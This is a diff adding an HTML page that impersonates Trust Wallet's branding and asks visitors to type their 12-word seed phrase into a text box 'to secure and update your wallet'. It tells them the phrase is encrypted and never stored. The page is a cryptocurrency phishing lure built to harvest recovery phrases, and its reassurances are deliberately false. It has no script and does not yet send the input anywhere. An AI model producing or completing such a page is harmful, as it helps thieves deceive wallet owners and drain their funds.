@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Connect</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: #f8fafc;
+            color: #1f2937;
+            line-height: 1.5;
+        }
+        
+        .container {
+            max-width: 440px;
+            margin: 40px auto;
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+        
+        .logo-section {
+            text-align: center;
+            padding: 40px 30px 20px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1e40af;
+            margin-bottom: 10px;
+        }
+        
+        .shield {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto;
+        }
+        
+        .content {
+            padding: 0 35px 40px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #475569;
+            margin-bottom: 35px;
+            font-size: 15.5px;
+        }
+        
+        .label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #374151;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 135px;
+            padding: 16px;
+            border: 2px solid #cbd5e1;
+            border-radius: 12px;
+            font-size: 16px;
+            resize: vertical;
+            font-family: inherit;
+        }
+        
+        .helper-text {
+            font-size: 14px;
+            color: #64748b;
+            margin: 10px 0 30px;
+        }
+        
+        .confirm-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .signup-link {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 15px;
+        }
+        
+        .secure-box {
+            background-color: #f0f9ff;
+            padding: 20px;
+            border-radius: 12px;
+            font-size: 14.5px;
+        }
+        
+        .secure-box strong {
+            display: block;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo-section">
+            <div class="logo-text">Trust Wallet</div>
+            <svg class="shield" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                <path d="M100 25 L165 65 L165 135 L100 175 L35 135 L35 65 Z" fill="#1e40af"/>
+                <path d="M100 25 L165 65 L100 105 L35 65 Z" fill="#3b82f6"/>
+                <text x="100" y="125" text-anchor="middle" fill="white" font-size="22" font-weight="bold">TRUST</text>
+            </svg>
+        </div>
+
+        <div class="content">
+            <h1>Welcome Back</h1>
+            <p class="subtitle">Enter your wallet's seed phrase to secure and update your wallet</p>
+
+            <label class="label">Seed Phrase</label>
+            <textarea placeholder="Enter your 12-word seed phrase..."></textarea>
+            
+            <p class="helper-text">Enter all 12 words separated by spaces</p>
+
+            <button class="confirm-btn">Confirm</button>
+
+            <div class="signup-link">
+                Don't have an account? <span style="color: #2563eb;">Sign Up</span>
+            </div>
+
+            <!-- Secure Box -->
+            <div class="secure-box">
+                <strong>🔒 Secure Sign In</strong>
+                <ul style="padding-left: 20px; line-height: 1.6;">
+                    <li>Your seed phrase is encrypted and never stored in plain text</li>
+                    <li>Only you have access to your account</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
